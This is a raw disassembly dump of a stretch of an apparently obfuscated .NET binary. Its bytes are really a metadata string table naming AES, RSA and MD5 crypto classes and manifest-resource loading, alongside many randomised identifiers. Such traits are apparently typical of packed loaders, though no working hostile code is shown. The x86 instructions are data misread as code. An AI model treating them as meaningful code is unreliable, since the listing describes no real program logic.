  408fb0:	4a 56                	rex.WX push %rsi
  408fb2:	37                   	(bad)
  408fb3:	00 7a 52             	add    %bh,0x52(%rdx)
  408fb6:	48                   	rex.W
  408fb7:	42 30 50 5a          	rex.X xor %dl,0x5a(%rax)
  408fbb:	6e                   	outsb  (%rsi),(%dx)
  408fbc:	49 00 63 64          	rex.WB add %spl,0x64(%r11)
  408fc0:	67 59                	addr32 pop %rcx
  408fc2:	45 52                	rex.RB push %r10
  408fc4:	68 31 56 00 55       	push   $0x55005631
  408fc9:	49 6e                	rex.WB outsb (%rsi),(%dx)
  408fcb:	74 33                	je     0x409000
  408fcd:	32 00                	xor    (%rax),%al
  408fcf:	4c                   	rex.WR
  408fd0:	41 59                	pop    %r9
  408fd2:	36 53                	ss push %rbx
  408fd4:	57                   	push   %rdi
  408fd5:	4b 38 58 00          	rex.WXB cmp %bl,0x0(%r8)
  408fd9:	70 37                	jo     0x409012
  408fdb:	30 43 65             	xor    %al,0x65(%rbx)
  408fde:	69 65 5a 78 00 78 75 	imul   $0x75780078,0x5a(%rbp),%esp
  408fe5:	48                   	rex.W
  408fe6:	46 55                	rex.RX push %rbp
  408fe8:	32 4f 48             	xor    0x48(%rdi),%cl
  408feb:	35 00 64 57 4a       	xor    $0x4a576400,%eax
  408ff0:	31 54 50 4f          	xor    %edx,0x4f(%rax,%rdx,2)
  408ff4:	75 73                	jne    0x409069
  408ff6:	00 52 75             	add    %dl,0x75(%rdx)
  408ff9:	6e                   	outsb  (%rsi),(%dx)
  408ffa:	74 69                	je     0x409065
  408ffc:	6d                   	insl   (%dx),(%rdi)
  408ffd:	65 48                	gs rex.W
  408fff:	65 6c                	gs insb (%dx),(%rdi)
  409001:	70 65                	jo     0x409068
  409003:	72 73                	jb     0x409078
  409005:	00 49 6e             	add    %cl,0x6e(%rcx)
  409008:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
  40900f:	65 
  409010:	41 72 72             	rex.B jb 0x409085
  409013:	61                   	(bad)
  409014:	79 00                	jns    0x409016
  409016:	41 72 72             	rex.B jb 0x40908b
  409019:	61                   	(bad)
  40901a:	79 00                	jns    0x40901c
  40901c:	52                   	push   %rdx
  40901d:	75 6e                	jne    0x40908d
  40901f:	74 69                	je     0x40908a
  409021:	6d                   	insl   (%dx),(%rdi)
  409022:	65 46 69 65 6c 64 48 	rex.RX imul $0x6e614864,%gs:0x6c(%rbp),%r12d
  409029:	61 6e 
  40902b:	64 6c                	fs insb (%dx),(%rdi)
  40902d:	65 00 5a 65          	add    %bl,%gs:0x65(%rdx)
  409031:	72 6f                	jb     0x4090a2
  409033:	00 52 53             	add    %dl,0x53(%rdx)
  409036:	41                   	rex.B
  409037:	43 72 79             	rex.XB jb 0x4090b3
  40903a:	70 74                	jo     0x4090b0
  40903c:	6f                   	outsl  (%rsi),(%dx)
  40903d:	53                   	push   %rbx
  40903e:	65 72 76             	gs jb  0x4090b7
  409041:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%rbx),%esp
  409048:	69 64 65 72 00 73 65 	imul   $0x74657300,0x72(%rbp,%riz,2),%esp
  40904f:	74 
  409050:	5f                   	pop    %rdi
  409051:	55                   	push   %rbp
  409052:	73 65                	jae    0x4090b9
  409054:	4d 61                	rex.WRB (bad)
  409056:	63 68 69             	movsxd 0x69(%rax),%ebp
  409059:	6e                   	outsb  (%rsi),(%dx)
  40905a:	65 4b                	gs rex.WXB
  40905c:	65 79 53             	gs jns 0x4090b2
  40905f:	74 6f                	je     0x4090d0
  409061:	72 65                	jb     0x4090c8
  409063:	00 43 45             	add    %al,0x45(%rbx)
  409066:	47 33 70 45          	rex.RXB xor 0x45(%r8),%r14d
  40906a:	4f 53                	rex.WRXB push %r11
  40906c:	42 37                	rex.X (bad)
  40906e:	33 55 69             	xor    0x69(%rbp),%edx
  409071:	00 7a 62             	add    %bh,0x62(%rdx)
  409074:	54                   	push   %rsp
  409075:	33 67 48             	xor    0x48(%rdi),%esp
  409078:	63 61 6b             	movsxd 0x6b(%rcx),%esp
  40907b:	00 55 49             	add    %dl,0x49(%rbp)
  40907e:	6e                   	outsb  (%rsi),(%dx)
  40907f:	74 36                	je     0x4090b7
  409081:	34 00                	xor    $0x0,%al
  409083:	42 69 74 43 6f 6e 76 	imul   $0x7265766e,0x6f(%rbx,%r8,2),%esi
  40908a:	65 72 
  40908c:	74 65                	je     0x4090f3
  40908e:	72 00                	jb     0x409090
  409090:	43 6f                	rex.XB outsl (%rsi),(%dx)
  409092:	70 79                	jo     0x40910d
  409094:	00 78 65             	add    %bh,0x65(%rax)
  409097:	34 79                	xor    $0x79,%al
  409099:	61                   	(bad)
  40909a:	39 6d 6a             	cmp    %ebp,0x6a(%rbp)
  40909d:	43 00 55 49          	rex.XB add %dl,0x49(%r13)
  4090a1:	6e                   	outsb  (%rsi),(%dx)
  4090a2:	74 31                	je     0x4090d5
  4090a4:	36 00 62 37          	ss add %ah,0x37(%rdx)
  4090a8:	4a                   	rex.WX
  4090a9:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
  4090ab:	36 46                	ss rex.RX
  4090ad:	4e 74 00             	rex.WRX je 0x4090b0
  4090b0:	46 55                	rex.RX push %rbp
  4090b2:	76 63                	jbe    0x409117
  4090b4:	31 56 54             	xor    %edx,0x54(%rsi)
  4090b7:	30 64 00 67          	xor    %ah,0x67(%rax,%rax,1)
  4090bb:	6c                   	insb   (%dx),(%rdi)
  4090bc:	70 6a                	jo     0x409128
  4090be:	4b 59                	rex.WXB pop %r9
  4090c0:	35 58 78 00 43       	xor    $0x43007858,%eax
  4090c5:	6f                   	outsl  (%rsi),(%dx)
  4090c6:	47 51                	rex.RXB push %r9
  4090c8:	6e                   	outsb  (%rsi),(%dx)
  4090c9:	44 59                	rex.R pop %rcx
  4090cb:	6a 64                	push   $0x64
  4090cd:	00 79 79             	add    %bh,0x79(%rcx)
  4090d0:	65 71 74             	gs jno 0x409147
  4090d3:	33 52 41             	xor    0x41(%rdx),%edx
  4090d6:	50                   	push   %rax
  4090d7:	00 66 76             	add    %ah,0x76(%rsi)
  4090da:	52                   	push   %rdx
  4090db:	67 6d                	insl   (%dx),(%edi)
  4090dd:	73 6a                	jae    0x409149
  4090df:	58                   	pop    %rax
  4090e0:	37                   	(bad)
  4090e1:	00 41 65             	add    %al,0x65(%rcx)
  4090e4:	73 43                	jae    0x409129
  4090e6:	72 79                	jb     0x409161
  4090e8:	70 74                	jo     0x40915e
  4090ea:	6f                   	outsl  (%rsi),(%dx)
  4090eb:	53                   	push   %rbx
  4090ec:	65 72 76             	gs jb  0x409165
  4090ef:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%rbx),%esp
  4090f6:	69 64 65 72 00 53 79 	imul   $0x73795300,0x72(%rbp,%riz,2),%esp
  4090fd:	73 
  4090fe:	74 65                	je     0x409165
  409100:	6d                   	insl   (%dx),(%rdi)
  409101:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
  409104:	72 65                	jb     0x40916b
  409106:	00 41 63             	add    %al,0x63(%rcx)
  409109:	74 69                	je     0x409174
  40910b:	76 61                	jbe    0x40916e
  40910d:	74 6f                	je     0x40917e
  40910f:	72 00                	jb     0x409111
  409111:	43 72 65             	rex.XB jb 0x409179
  409114:	61                   	(bad)
  409115:	74 65                	je     0x40917c
  409117:	49 6e                	rex.WB outsb (%rsi),(%dx)
  409119:	73 74                	jae    0x40918f
  40911b:	61                   	(bad)
  40911c:	6e                   	outsb  (%rsi),(%dx)
  40911d:	63 65 00             	movsxd 0x0(%rbp),%esp
  409120:	4f 62 6a 65 63 74    	(bad)
  409126:	48 61                	rex.W (bad)
  409128:	6e                   	outsb  (%rsi),(%dx)
  409129:	64 6c                	fs insb (%dx),(%rdi)
  40912b:	65 00 53 79          	add    %dl,%gs:0x79(%rbx)
  40912f:	73 74                	jae    0x4091a5
  409131:	65 6d                	gs insl (%dx),(%rdi)
  409133:	2e 52                	cs push %rdx
  409135:	75 6e                	jne    0x4091a5
  409137:	74 69                	je     0x4091a2
  409139:	6d                   	insl   (%dx),(%rdi)
  40913a:	65 2e 52             	gs cs push %rdx
  40913d:	65 6d                	gs insl (%dx),(%rdi)
  40913f:	6f                   	outsl  (%rsi),(%dx)
  409140:	74 69                	je     0x4091ab
  409142:	6e                   	outsb  (%rsi),(%dx)
  409143:	67 00 55 6e          	add    %dl,0x6e(%ebp)
  409147:	77 72                	ja     0x4091bb
  409149:	61                   	(bad)
  40914a:	70 00                	jo     0x40914c
  40914c:	65 34 44             	gs xor $0x44,%al
  40914f:	64 61                	fs (bad)
  409151:	55                   	push   %rbp
  409152:	55                   	push   %rbp
  409153:	65 32 00             	xor    %gs:(%rax),%al
  409156:	43 72 79             	rex.XB jb 0x4091d2
  409159:	70 74                	jo     0x4091cf
  40915b:	6f                   	outsl  (%rsi),(%dx)
  40915c:	43 6f                	rex.XB outsl (%rsi),(%dx)
  40915e:	6e                   	outsb  (%rsi),(%dx)
  40915f:	66 69 67 00 67 65    	imul   $0x6567,0x0(%rdi),%sp
  409165:	74 5f                	je     0x4091c6
  409167:	41 6c                	rex.B insb (%dx),(%rdi)
  409169:	6c                   	insb   (%dx),(%rdi)
  40916a:	6f                   	outsl  (%rsi),(%dx)
  40916b:	77 4f                	ja     0x4091bc
  40916d:	6e                   	outsb  (%rsi),(%dx)
  40916e:	6c                   	insb   (%dx),(%rdi)
  40916f:	79 46                	jns    0x4091b7
  409171:	69 70 73 41 6c 67 6f 	imul   $0x6f676c41,0x73(%rax),%esi
  409178:	72 69                	jb     0x4091e3
  40917a:	74 68                	je     0x4091e4
  40917c:	6d                   	insl   (%dx),(%rdi)
  40917d:	73 00                	jae    0x40917f
  40917f:	45 75 73             	rex.RB jne 0x4091f5
  409182:	6b 75 36 53          	imul   $0x53,0x36(%rbp),%esi
  409186:	4a 33 00             	rex.WX xor (%rax),%rax
  409189:	4d                   	rex.WRB
  40918a:	44 35 43 72 79 70    	rex.R xor $0x70797243,%eax
  409190:	74 6f                	je     0x409201
  409192:	53                   	push   %rbx
  409193:	65 72 76             	gs jb  0x40920c
  409196:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%rbx),%esp
  40919d:	69 64 65 72 00 48 61 	imul   $0x73614800,0x72(%rbp,%riz,2),%esp
  4091a4:	73 
  4091a5:	68 41 6c 67 6f       	push   $0x6f676c41
  4091aa:	72 69                	jb     0x409215
  4091ac:	74 68                	je     0x409216
  4091ae:	6d                   	insl   (%dx),(%rdi)
  4091af:	00 43 6f             	add    %al,0x6f(%rbx)
  4091b2:	6d                   	insl   (%dx),(%rdi)
  4091b3:	70 75                	jo     0x40922a
  4091b5:	74 65                	je     0x40921c
  4091b7:	48 61                	rex.W (bad)
  4091b9:	73 68                	jae    0x409223
  4091bb:	00 6d 37             	add    %ch,0x37(%rbp)
  4091be:	6e                   	outsb  (%rsi),(%dx)
  4091bf:	38 42 59             	cmp    %al,0x59(%rdx)
  4091c2:	69 72 4d 00 67 65 74 	imul   $0x74656700,0x4d(%rdx),%esi
  4091c9:	5f                   	pop    %rdi
  4091ca:	4c                   	rex.WR
  4091cb:	65 6e                	outsb  %gs:(%rsi),(%dx)
  4091cd:	67 74 68             	addr32 je 0x409238
  4091d0:	00 48 6b             	add    %cl,0x6b(%rax)
  4091d3:	64 4b 51             	fs rex.WXB push %r9
  4091d6:	6c                   	insb   (%dx),(%rdi)
  4091d7:	31 59 41             	xor    %ebx,0x41(%rcx)
  4091da:	00 42 69             	add    %al,0x69(%rdx)
  4091dd:	6e                   	outsb  (%rsi),(%dx)
  4091de:	61                   	(bad)
  4091df:	72 79                	jb     0x40925a
  4091e1:	52                   	push   %rdx
  4091e2:	65 61                	gs (bad)
  4091e4:	64 65 72 00          	fs gs jb 0x4091e8
  4091e8:	64 6c                	fs insb (%dx),(%rdi)
  4091ea:	62 53 37 73 55       	(bad)
  4091ef:	73 38                	jae    0x409229
  4091f1:	00 54 72 69          	add    %dl,0x69(%rdx,%rsi,2)
  4091f5:	6d                   	insl   (%dx),(%rdi)
  4091f6:	00 67 65             	add    %ah,0x65(%rdi)
  4091f9:	74 5f                	je     0x40925a
  4091fb:	55                   	push   %rbp
  4091fc:	6e                   	outsb  (%rsi),(%dx)
  4091fd:	69 63 6f 64 65 00 72 	imul   $0x72006564,0x6f(%rbx),%esp
  409204:	41 6a 58             	rex.B push $0x58
  409207:	33 78 52             	xor    0x52(%rax),%edi
  40920a:	4c 78 00             	rex.WR js 0x40920d
  40920d:	46 35 43 39 56 75    	rex.RX xor $0x75563943,%eax
  409213:	49 31 35 00 62 74 42 	xor    %rsi,0x42746200(%rip)        # 0x42b4f41a
  40921a:	69 68 36 48 79 56 00 	imul   $0x567948,0x36(%rax),%ebp
  409221:	4d 61                	rex.WRB (bad)
  409223:	72 73                	jb     0x409298
  409225:	68 61 6c 00 53       	push   $0x53006c61
  40922a:	79 73                	jns    0x40929f
  40922c:	74 65                	je     0x409293
  40922e:	6d                   	insl   (%dx),(%rdi)
  40922f:	2e 52                	cs push %rdx
  409231:	75 6e                	jne    0x4092a1
  409233:	74 69                	je     0x40929e
  409235:	6d                   	insl   (%dx),(%rdi)
  409236:	65 2e 49 6e          	gs rex.WB outsb %gs:(%rsi),(%dx)
  40923a:	74 65                	je     0x4092a1
  40923c:	72 6f                	jb     0x4092ad
  40923e:	70 53                	jo     0x409293
  409240:	65 72 76             	gs jb  0x4092b9
  409243:	69 63 65 73 00 47 65 	imul   $0x65470073,0x65(%rbx),%esp
  40924a:	74 4d                	je     0x409299
  40924c:	65 74 68             	gs je  0x4092b7
  40924f:	6f                   	outsl  (%rsi),(%dx)
  409250:	64 00 74 6b 72       	add    %dh,%fs:0x72(%rbx,%rbp,2)
  409255:	6f                   	outsl  (%rsi),(%dx)
  409256:	51                   	push   %rcx
  409257:	69 4c 71 51 00 67 65 	imul   $0x74656700,0x51(%rcx,%rsi,2),%ecx
  40925e:	74 
  40925f:	5f                   	pop    %rdi
  409260:	4c 6f                	rex.WR outsl (%rsi),(%dx)
  409262:	63 61 74             	movsxd 0x74(%rcx),%esp
  409265:	69 6f 6e 00 47 65 74 	imul   $0x74654700,0x6e(%rdi),%ebp
  40926c:	4e 61                	rex.WRX (bad)
  40926e:	6d                   	insl   (%dx),(%rdi)
  40926f:	65 00 41 73          	add    %al,%gs:0x73(%rcx)
  409273:	73 65                	jae    0x4092da
  409275:	6d                   	insl   (%dx),(%rdi)
  409276:	62 6c 79 4e 61       	(bad)
  40927b:	6d                   	insl   (%dx),(%rdi)
  40927c:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
  409280:	74 5f                	je     0x4092e1
  409282:	43 6f                	rex.XB outsl (%rsi),(%dx)
  409284:	64 65 42 61          	fs gs rex.X (bad)
  409288:	73 65                	jae    0x4092ef
  40928a:	00 52 65             	add    %dl,0x65(%rdx)
  40928d:	70 6c                	jo     0x4092fb
  40928f:	61                   	(bad)
  409290:	63 65 00             	movsxd 0x0(%rbp),%esp
  409293:	47                   	rex.RXB
  409294:	65 74 54             	gs je  0x4092eb
  409297:	79 70                	jns    0x409309
  409299:	65 00 47 65          	add    %al,%gs:0x65(%rdi)
  40929d:	74 50                	je     0x4092ef
  40929f:	72 6f                	jb     0x409310
  4092a1:	70 65                	jo     0x409308
  4092a3:	72 74                	jb     0x409319
  4092a5:	79 00                	jns    0x4092a7
  4092a7:	50                   	push   %rax
  4092a8:	72 6f                	jb     0x409319
  4092aa:	70 65                	jo     0x409311
  4092ac:	72 74                	jb     0x409322
  4092ae:	79 49                	jns    0x4092f9
  4092b0:	6e                   	outsb  (%rsi),(%dx)
  4092b1:	66 6f                	outsw  (%rsi),(%dx)
  4092b3:	00 47 65             	add    %al,0x65(%rdi)
  4092b6:	74 56                	je     0x40930e
  4092b8:	61                   	(bad)
  4092b9:	6c                   	insb   (%dx),(%rdi)
  4092ba:	75 65                	jne    0x409321
  4092bc:	00 52 52             	add    %dl,0x52(%rdx)
  4092bf:	48 30 6e 6a          	rex.W xor %bpl,0x6a(%rsi)
  4092c3:	56                   	push   %rsi
  4092c4:	6b 53 00 46          	imul   $0x46,0x0(%rbx),%edx
  4092c8:	69 6c 65 53 74 72 65 	imul   $0x61657274,0x53(%rbp,%riz,2),%ebp
  4092cf:	61 
  4092d0:	6d                   	insl   (%dx),(%rdi)
  4092d1:	00 46 69             	add    %al,0x69(%rsi)
  4092d4:	6c                   	insb   (%dx),(%rdi)
  4092d5:	65 4d 6f             	rex.WRB outsl %gs:(%rsi),(%dx)
  4092d8:	64 65 00 46 69       	fs add %al,%gs:0x69(%rsi)
  4092dd:	6c                   	insb   (%dx),(%rdi)
  4092de:	65 41 63 63 65       	movsxd %gs:0x65(%r11),%esp
  4092e3:	73 73                	jae    0x409358
  4092e5:	00 46 69             	add    %al,0x69(%rsi)
  4092e8:	6c                   	insb   (%dx),(%rdi)
  4092e9:	65 53                	gs push %rbx
  4092eb:	68 61 72 65 00       	push   $0x657261
  4092f0:	52                   	push   %rdx
  4092f1:	65 61                	gs (bad)
  4092f3:	64 00 51 63          	add    %dl,%fs:0x63(%rcx)
  4092f7:	77 4f                	ja     0x409348
  4092f9:	51                   	push   %rcx
  4092fa:	62 31 6c 6f 00       	(bad)
  4092ff:	73 65                	jae    0x409366
  409301:	74 5f                	je     0x409362
  409303:	4b                   	rex.WXB
  409304:	65 79 00             	gs jns 0x409307
  409307:	73 65                	jae    0x40936e
  409309:	74 5f                	je     0x40936a
  40930b:	49 56                	rex.WB push %r14
  40930d:	00 76 51             	add    %dh,0x51(%rsi)
  409310:	47 72 69             	rex.RXB jb 0x40937c
  409313:	37                   	(bad)
  409314:	43                   	rex.XB
  409315:	67 6d                	insl   (%dx),(%edi)
  409317:	00 48 4c             	add    %cl,0x4c(%rax)
  40931a:	4f 56                	rex.WRXB push %r14
  40931c:	49 55                	rex.WB push %r13
  40931e:	65 70 64             	gs jo  0x409385
  409321:	00 41 45             	add    %al,0x45(%rcx)
  409324:	63 47 4c             	movsxd 0x4c(%rdi),%eax
  409327:	55                   	push   %rbp
  409328:	6f                   	outsl  (%rsi),(%dx)
  409329:	37                   	(bad)
  40932a:	62                   	(bad)
  40932b:	00 72 68             	add    %dh,0x68(%rdx)
  40932e:	48 6d                	rex.W insl (%dx),(%rdi)
  409330:	43                   	rex.XB
  409331:	36 33 4e 38          	ss xor 0x38(%rsi),%ecx
  409335:	00 45 5a             	add    %al,0x5a(%rbp)
  409338:	55                   	push   %rbp
  409339:	75 72                	jne    0x4093ad
  40933b:	41 51                	push   %r9
  40933d:	69 6b 00 49 66 6d 6c 	imul   $0x6c6d6649,0x0(%rbx),%ebp
  409344:	63 6a 48             	movsxd 0x48(%rdx),%ebp
  409347:	4c                   	rex.WR
  409348:	4d 00 50 72          	rex.WRB add %r10b,0x72(%r8)
  40934c:	57                   	push   %rdi
  40934d:	76 39                	jbe    0x409388
  40934f:	6a 73                	push   $0x73
  409351:	45                   	rex.RB
  409352:	4d 00 68 67          	rex.WRB add %r13b,0x67(%r8)
  409356:	55                   	push   %rbp
  409357:	68 36 46 65 66       	push   $0x66654636
  40935c:	49 00 75 6f          	rex.WB add %sil,0x6f(%r13)
  409360:	68 57 70 73 77       	push   $0x77737057
  409365:	4e 57                	rex.WRX push %rdi
  409367:	00 72 39             	add    %dh,0x39(%rdx)
  40936a:	51                   	push   %rcx
  40936b:	70 6d                	jo     0x4093da
  40936d:	6f                   	outsl  (%rsi),(%dx)
  40936e:	39 64 66 00          	cmp    %esp,0x0(%rsi,%riz,2)
  409372:	51                   	push   %rcx
  409373:	34 41                	xor    $0x41,%al
  409375:	45                   	rex.RB
  409376:	65 37                	gs (bad)
  409378:	76 55                	jbe    0x4093cf
  40937a:	47 53                	rex.RXB push %r11
  40937c:	72 36                	jb     0x4093b4
  40937e:	61                   	(bad)
  40937f:	4f 61                	rex.WRXB (bad)
  409381:	36 6b 35 00 47 65 74 	ss imul $0x4d,0x74654700(%rip),%esi        # 0x74a5da89
  409388:	4d 
  409389:	61                   	(bad)
  40938a:	6e                   	outsb  (%rsi),(%dx)
  40938b:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%rsi),%esp
  409392:	73 6f                	jae    0x409403
  409394:	75 72                	jne    0x409408
  409396:	63 65 53             	movsxd 0x53(%rbp),%esp
  409399:	74 72                	je     0x40940d
  40939b:	65 61                	gs (bad)
  40939d:	6d                   	insl   (%dx),(%rdi)
  40939e:	00 4d 41             	add    %cl,0x41(%rbp)
  4093a1:	43                   	rex.XB
  4093a2:	42                   	rex.X
  4093a3:	45 52                	rex.RB push %r10
  4093a5:	65 65 35 69 65 67 75 	gs gs xor $0x75676569,%eax
  4093ac:	73 49                	jae    0x4093f7
  4093ae:	71 44                	jno    0x4093f4
  4093b0:	51                   	push   %rcx
  4093b1:	00 67 65             	add    %ah,0x65(%rdi)
  4093b4:	74 5f                	je     0x409415
  4093b6:	42 61                	rex.X (bad)
  4093b8:	73 65                	jae    0x40941f
  4093ba:	53                   	push   %rbx
  4093bb:	74 72                	je     0x40942f
  4093bd:	65 61                	gs (bad)
  4093bf:	6d                   	insl   (%dx),(%rdi)
  4093c0:	00 41 54             	add    %al,0x54(%rcx)
  4093c3:	61                   	(bad)
  4093c4:	74 6b                	je     0x409431
  4093c6:	48 37                	rex.W (bad)
  4093c8:	4b 33 4a 6e          	rex.WXB xor 0x6e(%r10),%rcx
  4093cc:	41 59                	pop    %r9
  4093ce:	55                   	push   %rbp
  4093cf:	45 62 4b 4d 00 73 65 	rex.RB vpshrdd $0x5f,0x740(%r29),%xmm22,%xmm28
  4093d6:	74 5f 
  4093d8:	50                   	push   %rax
  4093d9:	6f                   	outsl  (%rsi),(%dx)
  4093da:	73 69                	jae    0x409445
  4093dc:	74 69                	je     0x409447
  4093de:	6f                   	outsl  (%rsi),(%dx)
  4093df:	6e                   	outsb  (%rsi),(%dx)
  4093e0:	00 6c 47 57          	add    %ch,0x57(%rdi,%rax,2)
  4093e4:	74 45                	je     0x40942b
  4093e6:	45                   	rex.RB
  4093e7:	49 5a                	rex.WB pop %r10
  4093e9:	6b 57 41 6f          	imul   $0x6f,0x41(%rdi),%edx
  4093ed:	66 39 4c 4e 6b       	cmp    %cx,0x6b(%rsi,%rcx,2)
  4093f2:	46 00 6f 41          	rex.RX add %r13b,0x41(%rdi)
  4093f6:	70 6a                	jo     0x409462
  4093f8:	45 30 4d 65          	xor    %r9b,0x65(%r13)
  4093fc:	38 4d 4f             	cmp    %cl,0x4f(%rbp)
  4093ff:	33 55 73             	xor    0x73(%rbp),%edx
  409402:	73 6c                	jae    0x409470
  409404:	75 66                	jne    0x40946c
  409406:	00 52 65             	add    %dl,0x65(%rdx)
  409409:	61                   	(bad)
  40940a:	64 42 79 74          	fs rex.X jns 0x409482
  40940e:	65 73 00             	gs jae 0x409411
  409411:	7a 44                	jp     0x409457
  409413:	4c                   	rex.WR
  409414:	42 6f                	rex.X outsl (%rsi),(%dx)
  409416:	57                   	push   %rdi
  409417:	4e 32 51 52          	rex.WRX xor 0x52(%rcx),%r10b
  40941b:	49 76 42             	rex.WB jbe 0x409460
  40941e:	44                   	rex.R
  40941f:	36 65 64 33 00       	ss gs xor %fs:(%rax),%eax
  409424:	6c                   	insb   (%dx),(%rdi)
  409425:	38 79 78             	cmp    %bh,0x78(%rcx)
  409428:	72 75                	jb     0x40949f
  40942a:	56                   	push   %rsi
  40942b:	72 39                	jb     0x409466
  40942d:	65 66 34 52          	gs data16 xor $0x52,%al
  409431:	68 33 31 52 49       	push   $0x49523133
  409436:	00 52 65             	add    %dl,0x65(%rdx)
  409439:	76 65                	jbe    0x4094a0
  40943b:	72 73                	jb     0x4094b0
  40943d:	65 00 75 32          	add    %dh,%gs:0x32(%rbp)
  409441:	78 32                	js     0x409475
  409443:	5a                   	pop    %rdx
  409444:	45 52                	rex.RB push %r10
  409446:	31 4d 62             	xor    %ecx,0x62(%rbp)
  409449:	56                   	push   %rsi
  40944a:	47 75 61             	rex.RXB jne 0x4094ae
  40944d:	73 59                	jae    0x4094a8
  40944f:	50                   	push   %rax
  409450:	41 00 47 38          	add    %al,0x38(%r15)
  409454:	54                   	push   %rsp
  409455:	63 39                	movsxd (%rcx),%edi
  409457:	67 6f                	outsl  (%esi),(%dx)
  409459:	46                   	rex.RX
  40945a:	41                   	rex.B
  40945b:	4e 58                	rex.WRX pop %rax
  40945d:	54                   	push   %rsp
  40945e:	77 4d                	ja     0x4094ad
  409460:	58                   	pop    %rax
  409461:	39 61 70             	cmp    %esp,0x70(%rcx)
  409464:	00 47 65             	add    %al,0x65(%rdi)
  409467:	74 50                	je     0x4094b9
  409469:	75 62                	jne    0x4094cd
  40946b:	6c                   	insb   (%dx),(%rdi)
  40946c:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
  409473:	6b 65 6e 00          	imul   $0x0,0x6e(%rbp),%esp
  409477:	4a 58                	rex.WX pop %rax
  409479:	44 58                	rex.R pop %rax
  40947b:	56                   	push   %rsi
  40947c:	62 77 34 6e 39       	(bad)
  409481:	76 69                	jbe    0x4094ec
  409483:	61                   	(bad)
  409484:	35 6d 30 4c 6b       	xor    $0x6b4c306d,%eax
  409489:	00 45 77             	add    %al,0x77(%rbp)
  40948c:	6a 79                	push   $0x79
  40948e:	37                   	(bad)
  40948f:	74 62                	je     0x4094f3
  409491:	4b 6c                	rex.WXB insb (%dx),(%rdi)
  409493:	76 66                	jbe    0x4094fb
  409495:	5a                   	pop    %rdx
  409496:	48 69 67 52 78 4c 00 	imul   $0x67004c78,0x52(%rdi),%rsp
  40949d:	67 
  40949e:	74 46                	je     0x4094e6
  4094a0:	64 79 63             	fs jns 0x409506
  4094a3:	54                   	push   %rsp
  4094a4:	6c                   	insb   (%dx),(%rdi)
  4094a5:	55                   	push   %rbp
  4094a6:	5a                   	pop    %rdx
  4094a7:	6a 63                	push   $0x63
  4094a9:	71 56                	jno    0x409501
  4094ab:	58                   	pop    %rax
  4094ac:	57                   	push   %rdi
  4094ad:	76 4b                	jbe    0x4094fa
  4094af:	00 67 76             	add    %ah,0x76(%rdi)
  4094b2:	6f                   	outsl  (%rsi),(%dx)
  4094b3:	62                   	(bad)
  4094b4:	70 75                	jo     0x40952b
  4094b6:	6a 6f                	push   $0x6f
  4094b8:	53                   	push   %rbx
  4094b9:	57                   	push   %rdi
  4094ba:	50                   	push   %rax
  4094bb:	57                   	push   %rdi
  4094bc:	31 49 35             	xor    %ecx,0x35(%rcx)
  4094bf:	79 4c                	jns    0x40950d
  4094c1:	51                   	push   %rcx
  4094c2:	00 44 6b 52          	add    %al,0x52(%rbx,%rbp,2)
  4094c6:	36 49 6b 48 49 6e    	ss imul $0x6e,0x49(%r8),%rcx
  4094cc:	45                   	rex.RB
  4094cd:	4d 72 69             	rex.WRB jb 0x409539
  4094d0:	76 73                	jbe    0x409545
  4094d2:	45                   	rex.RB
  4094d3:	4b 73 00             	rex.WXB jae 0x4094d6
  4094d6:	46 6c                	rex.RX insb (%dx),(%rdi)
  4094d8:	75 73                	jne    0x40954d
  4094da:	68 46 69 6e 61       	push   $0x616e6946
  4094df:	6c                   	insb   (%dx),(%rdi)
  4094e0:	42 6c                	rex.X insb (%dx),(%rdi)
  4094e2:	6f                   	outsl  (%rsi),(%dx)
  4094e3:	63 6b 00             	movsxd 0x0(%rbx),%ebp
  4094e6:	49 53                	rex.WB push %r11
  4094e8:	6d                   	insl   (%dx),(%rdi)
  4094e9:	41 59                	pop    %r9
  4094eb:	4d 34 79             	rex.WRB xor $0x79,%al
  4094ee:	38 55 72             	cmp    %dl,0x72(%rbp)
  4094f1:	67 4f 50             	addr32 rex.WRXB push %r8
  4094f4:	39 62 41             	cmp    %esp,0x41(%rdx)
  4094f7:	31 00                	xor    %eax,(%rax)
  4094f9:	6d                   	insl   (%dx),(%rdi)
  4094fa:	63 32                	movsxd (%rdx),%esi
  4094fc:	34 4e                	xor    $0x4e,%al
  4094fe:	72 69                	jb     0x409569
  409500:	64 69 74 66 48 35 38 	imul   $0x33353835,%fs:0x48(%rsi,%riz,2),%esi
  409507:	35 33 
  409509:	48                   	rex.W
  40950a:	36 00 78 59          	ss add %bh,0x59(%rax)
  40950e:	6d                   	insl   (%dx),(%rdi)
  40950f:	77 77                	ja     0x409588
  409511:	6c                   	insb   (%dx),(%rdi)
  409512:	61                   	(bad)
  409513:	33 77 49             	xor    0x49(%rdi),%esi
  409516:	43                   	rex.XB
  409517:	4e                   	rex.WRX
  409518:	65 38 69 65          	cmp    %ch,%gs:0x65(%rcx)
  40951c:	54                   	push   %rsp
  40951d:	6b 00 54             	imul   $0x54,(%rax),%eax
  409520:	6f                   	outsl  (%rsi),(%dx)
  409521:	49 6e                	rex.WB outsb (%rsi),(%dx)
  409523:	74 33                	je     0x409558
  409525:	32 00                	xor    (%rax),%al
  409527:	67 63 4b 30          	movsxd 0x30(%ebx),%ecx
  40952b:	59                   	pop    %rcx
  40952c:	55                   	push   %rbp
  40952d:	59                   	pop    %rcx
  40952e:	37                   	(bad)
  40952f:	77 5a                	ja     0x40958b
  409531:	55                   	push   %rbp
  409532:	47                   	rex.RXB
  409533:	45 70 72             	rex.RB jo 0x4095a8
  409536:	46                   	rex.RX
  409537:	41 51                	push   %r9
  409539:	00 79 4a             	add    %bh,0x4a(%rcx)
  40953c:	76 6c                	jbe    0x4095aa
  40953e:	4d                   	rex.WRB
  40953f:	4f 39 50 67          	rex.WRXB cmp %r10,0x67(%r8)
  409543:	6b 56 67 6f          	imul   $0x6f,0x67(%rsi),%edx
  409547:	33 77 58             	xor    0x58(%rdi),%esi
